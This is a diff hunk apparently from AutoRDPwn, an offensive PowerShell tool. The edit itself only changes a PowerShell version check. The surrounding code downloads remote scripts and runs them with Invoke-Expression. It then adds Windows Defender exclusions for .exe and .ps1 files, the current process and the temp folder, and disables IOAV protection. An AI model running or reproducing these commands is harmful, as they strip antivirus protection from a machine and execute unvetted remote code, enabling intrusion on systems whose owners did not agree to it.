@@ -97,7 +97,7 @@ function Remove-Exclusions {
     if($language -in 'English') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Languages/English.ps1') }
     if($language -in 'Spanish') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Languages/Spanish.ps1') }
 
-    if($nogui) { $null } else { $Powershell = $host.version ; Write-Host ; if($Powershell -lt 4) { Write-Host "$txt3" -ForegroundColor 'Red' ; Write-Host
+    $powershell = $host.version ; Write-Host ; if($powershell.major -lt 4) { Write-Host "$txt3" -ForegroundColor 'Red' ; Write-Host
     Write-Host "$txt4" -NoNewLine -ForegroundColor 'Red' ; Write-Host -NoNewLine ; Write-Host " http://aka.ms/wmf5download" -ForegroundColor 'Blue' ; Write-Host ; sleep -milliseconds 7500 ; exit }}
     Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null; Add-MpPreference -ExclusionProcess $pid 2>&1> $null ; Add-MpPreference -ExclusionPath $env:temp 2>&1> $null
     Add-MpPreference -ExclusionExtension ".ps1" 2>&1> $null ; Set-MpPreference -DisableIOAVProtection 1 2>&1> $null
